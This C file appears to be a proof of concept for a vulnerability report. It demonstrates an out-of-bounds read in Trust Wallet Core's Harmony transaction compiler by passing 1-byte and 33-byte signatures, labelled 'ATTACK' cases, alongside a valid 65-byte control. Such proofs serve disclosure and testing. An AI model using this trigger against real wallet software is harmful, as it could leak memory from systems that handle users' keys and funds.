// test_harmony_asan.c — Native ASan proof: Harmony compile OOB read via short external signature.
// Bug: src/Harmony/Signer.cpp values() reads 65 bytes from caller-supplied signature
// without length check; bytes past the buffer are returned as r/s/v in the output.
// Entry: TWTransactionCompilerCompileWithSignatures (documented MPC compile API).
#include <TrustWalletCore/TWData.h>
#include <TrustWalletCore/TWDataVector.h>
#include <TrustWalletCore/TWCoinType.h>
#include <TrustWalletCore/TWTransactionCompiler.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const char *INPUT_HEX =
    "0a01011a480a01091201001a025208222a6f6e65316432726e676d656d34783263367a78736a6a7a3239646c6168306a7a6b72306b326e383877632a084c53ecdc18a6000032003a0101420100";
static const char *PUB_HEX =
    "0497f8ea1cb7fe71544899331d6e34b650b405ffee718c0e7fc0933571472c29db198d9ea495c7226c29d2a01cc1eed86e9f9069b7c1a7ceb48142ed619fb2ea80";
static const char *SIG65_HEX =
    "fd5f89321b3704f02bce93c821a49259f19c71129d51db22483168c92c6a54d951403a02f7989b3fd92a10d19338ed0805502a892de98c62a06316bd8f0f5fc100";

static size_t parse_hex(const char *hex, uint8_t *out, size_t max) {
    size_t n = strlen(hex) / 2;
    if (n > max) n = max;
    for (size_t i = 0; i < n; i++) {
        unsigned v;
        sscanf(hex + 2 * i, "%2x", &v);
        out[i] = (uint8_t)v;
    }
    return n;
}

static void print_head(const char *label, TWData *d) {
    size_t sz = TWDataSize(d);
    uint8_t *b = TWDataBytes(d);
    printf("%s (%zu bytes): ", label, sz);
    for (size_t i = 0; i < sz && i < 96; i++) printf("%02x", b[i]);
    printf("\n");
}

static void run_case(const char *label, const uint8_t *input, size_t inputLen,
                     const uint8_t *sig, size_t sigLen,
                     const uint8_t *pub, size_t pubLen) {
    TWData *in = TWDataCreateWithBytes(input, inputLen);
    TWData *s = TWDataCreateWithBytes(sig, sigLen);
    TWData *p = TWDataCreateWithBytes(pub, pubLen);
    TWDataVector *sigs = TWDataVectorCreateWithData(s);
    TWDataVector *pubs = TWDataVectorCreateWithData(p);
    printf("=== %s (signature length: %zu) ===\n", label, sigLen);
    TWData *out = TWTransactionCompilerCompileWithSignatures(TWCoinTypeHarmony, in, sigs, pubs);
    if (out == NULL) { printf("  returned NULL\n"); }
    else { print_head("  output", out); TWDataDelete(out); }
    TWDataVectorDelete(sigs); TWDataVectorDelete(pubs);
    TWDataDelete(s); TWDataDelete(p); TWDataDelete(in);
}

int main(void) {
    uint8_t input[512], pub[128], sig65[128], sig1[1] = {0x41}, sig33[64];
    size_t inputLen = parse_hex(INPUT_HEX, input, sizeof(input));
    size_t pubLen = parse_hex(PUB_HEX, pub, sizeof(pub));
    size_t sig65Len = parse_hex(SIG65_HEX, sig65, sizeof(sig65));
    memset(sig33, 0, sizeof(sig33));
    sig33[0] = 0xab; sig33[32] = 0xcd; // 33-byte: 1 byte in r-range + first byte of s

    printf("wallet-core Harmony compile OOB read test\n");
    run_case("CONTROL 65-byte signature (legitimate MPC flow)", input, inputLen, sig65, sig65Len, pub, pubLen);
    run_case("ATTACK 33-byte signature", input, inputLen, sig33, 33, pub, pubLen);
    run_case("ATTACK 1-byte signature", input, inputLen, sig1, 1, pub, pubLen);
    printf("DONE\n");
    return 0;
}
